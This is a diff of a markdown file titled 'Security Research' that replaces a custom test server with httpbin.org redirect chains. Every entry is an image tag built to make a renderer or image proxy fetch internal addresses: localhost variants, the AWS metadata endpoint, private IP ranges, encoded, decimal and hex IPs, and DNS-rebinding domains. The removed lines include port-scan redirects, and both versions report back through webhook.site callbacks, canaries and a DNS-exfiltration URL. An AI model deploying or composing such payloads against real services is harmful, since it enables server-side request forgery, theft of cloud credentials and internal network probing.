@@ -1,85 +1,98 @@
-# Security Research - v25
+# Security Research - v26
 
-## Custom Server Redirect Testing (Fixed HTML)
+## httpbin.org Redirect Chain SSRF Tests
 
-Using standard `<img>` tags with your test server redirect endpoints.
-
----
-
-### 1) Baseline - Direct Fetch
-![t1-baseline](http://164.90.187.218:8080/ssrf-test-1-basic?nonce=v25-1)
+Using httpbin.org's redirect-to endpoint to test redirect-based SSRF.
 
 ---
 
-### 2) Timeout Tests
-![t2-slow-10s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=10&nonce=v25-2)
-![t3-slow-30s](http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=v25-3)
+### 1) Baseline - External Redirect (Should work)
+![ext-redirect](https://httpbin.org/redirect-to?url=https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/external-redir.gif)
 
 ---
 
-### 3) Size Limits
-![t4-large-10mb](http://164.90.187.218:8080/ssrf-test-6-large?size=10&nonce=v25-4)
-![t5-large-50mb](http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=v25-5)
+### 2) Redirect to localhost variants
+
+#### 127.0.0.1
+![redir-127](https://httpbin.org/redirect-to?url=http://127.0.0.1/ssrf.gif)
+
+#### localhost
+![redir-localhost](https://httpbin.org/redirect-to?url=http://localhost/ssrf.gif)
+
+#### 0.0.0.0
+![redir-0](https://httpbin.org/redirect-to?url=http://0.0.0.0/ssrf.gif)
 
 ---
 
-### 4) External Redirect Tests
-![t6-external-redirect](http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=v25-6)
+### 3) Redirect to AWS Metadata
+![redir-meta](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
 
 ---
 
-### 5) SSRF Redirect to Internal IPs
-
-#### Localhost (127.0.0.1)
-![t7-redir-localhost](http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=v25-7)
-
-#### AWS Metadata (169.254.169.254)
-![t8-redir-metadata](http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=v25-8)
-
-#### RFC1918 - 10.x.x.x
-![t9-redir-10](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=v25-9)
-
-#### RFC1918 - 192.168.x.x
-![t10-redir-192](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-192&nonce=v25-10)
-
-#### RFC1918 - 172.16.x.x
-![t11-redir-172](http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-172&nonce=v25-11)
+### 4) Redirect to RFC1918 ranges
+![redir-10](https://httpbin.org/redirect-to?url=http://10.0.0.1/ssrf.gif)
+![redir-172](https://httpbin.org/redirect-to?url=http://172.16.0.1/ssrf.gif)
+![redir-192](https://httpbin.org/redirect-to?url=http://192.168.1.1/ssrf.gif)
 
 ---
 
-### 6) URL Parser Edge Cases
+### 5) Multi-hop redirect chains
 
-#### Userinfo Host Swap
-![t12-userinfo](http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=v25-12)
+#### 2 hops to localhost
+![2hop-local](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://127.0.0.1/)
 
-#### IPv6 Loopback
-![t13-ipv6](http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=v25-13)
-
----
-
-### 7) Port Scan via Redirect
-![t14-port22](http://164.90.187.218:8080/redirect-to-port?port=22&nonce=v25-14)
-![t15-port8443](http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=v25-15)
-![t16-port3306](http://164.90.187.218:8080/redirect-to-port?port=3306&nonce=v25-16)
+#### 3 hops to metadata
+![3hop-meta](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/)
 
 ---
 
-### 8) Double Redirect
-![t17-double](http://164.90.187.218:8080/double-redirect?first=external&second=localhost&nonce=v25-17)
+### 6) URL-encoded redirect targets
+
+#### Double-encoded localhost
+![enc-local](https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%2F)
+
+#### Unicode localhost (ⓛocalhost)
+![unicode-local](https://httpbin.org/redirect-to?url=http://%E2%93%9Bocalhost/)
 
 ---
 
-### 9) Protocol Downgrade
-![t18-proto-down](http://164.90.187.218:8080/redirect-protocol?from=https&to=http&target=127.0.0.1&nonce=v25-18)
+### 7) IPv6 localhost via redirect
+![ipv6-local](https://httpbin.org/redirect-to?url=http://[::1]/)
+![ipv6-ffff](https://httpbin.org/redirect-to?url=http://[::ffff:127.0.0.1]/)
 
 ---
 
-### 10) DNS Exfil
-![dns](https://v25-dns.371a7bef-c794-483b-8e77-3acbefb81362.dnshook.site/dns.gif)
-
-### 11) Canary
-![v25-canary](https://webhook.site/371a7bef-c794-483b-8e77-3acbefb81362/v25-canary.gif)
+### 8) Decimal/Hex IP via redirect
+![decimal-ip](https://httpbin.org/redirect-to?url=http://2130706433/)
+![hex-ip](https://httpbin.org/redirect-to?url=http://0x7f000001/)
 
 ---
 
-*v25 - Custom server redirect testing with standard img tags*
+### 9) DNS rebinding domains via redirect
+![nip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.nip.io/)
+![sslip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.sslip.io/)
+
+---
+
+### 10) Protocol downgrade via redirect
+![https-to-http](https://httpbin.org/redirect-to?url=http://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/protocol-downgrade.gif)
+
+---
+
+### 11) Relative redirect (httpbin supports this)
+![relative](https://httpbin.org/relative-redirect/3)
+
+---
+
+### 12) Success Callback
+![success](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/redirect-chain-success.gif)
+
+### 13) DNS Exfil
+![dns](https://v26-dns.c6cb2ba9-5868-422f-a30e-86133a87aa32.dnshook.site/dns.gif)
+
+### 14) Canary
+![v26-canary](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/v26-canary.gif)
+
+---
+
+*v26 - httpbin.org redirect chain SSRF tests*
